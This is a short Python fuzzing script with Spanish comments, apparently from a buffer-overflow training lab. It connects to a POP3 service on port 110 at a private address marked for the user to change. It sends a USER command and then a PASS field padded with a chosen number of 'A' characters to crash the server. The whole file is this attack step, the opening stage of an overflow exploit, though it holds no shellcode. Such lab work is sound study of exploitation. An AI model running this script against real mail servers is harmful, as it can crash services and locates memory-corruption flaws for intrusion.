#!/usr/bin/python3

import socket
import sys

# Verificamos el número correcto de argumentos de línea de comandos
if len(sys.argv) != 2:
    print("\n[!] Uso: Fuzzer_manual.py <longitud>\n")
    exit(1)

# Establecemos la dirección IP del objetivo, el puerto y la longitud total desde los argumentos de la línea de comandos
ip_address = "192.168.68.128"  # Dirección IP del objetivo, *******Cambiar esto*******
port = 110  # Puerto del objetivo *******Cambiar esto*******
total_length = int(sys.argv[1])  # Longitud proporcionada como argumento de línea de comandos

# Función para realizar el exploit
def exploit():
    # Creamos un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectamos al objetivo
    s.connect((ip_address, port))

    # Recibimos el banner
    banner = s.recv(1024)
    # print(banner)

    # Enviamos el usuario en formato de bytes
    s.send(b"USER b3xal" + b'\r\n')  # El retorno de carro y salto de línea es equivalente a presionar enter y enviar los datos

    # Recibimos e imprimimos la respuesta
    response = s.recv(1024)
    # print(response)

    # Enviamos la contraseña, enviando una cadena de 'A's con la longitud especificada
    s.send(b"PASS" + b"A" * total_length + b'\r\n')

# Verificamos si el script se ejecuta como programa principal
if __name__ == '__main__':
    # Llamamos a la función de exploit
    exploit()
